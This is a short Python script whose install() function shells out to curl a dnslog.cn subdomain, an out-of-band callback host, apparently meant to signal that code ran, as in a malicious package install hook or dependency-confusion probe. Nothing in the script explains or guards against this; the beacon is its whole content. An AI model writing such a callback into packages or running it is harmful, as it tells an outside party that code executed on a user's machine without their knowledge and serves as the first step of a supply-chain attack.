 import subprocess
  import sys

  def install():
      cmd = "curl test2.l199t2.dnslog.cn"
      subprocess.run(cmd, shell=True)

  if __name__ == "__main__":
      install()
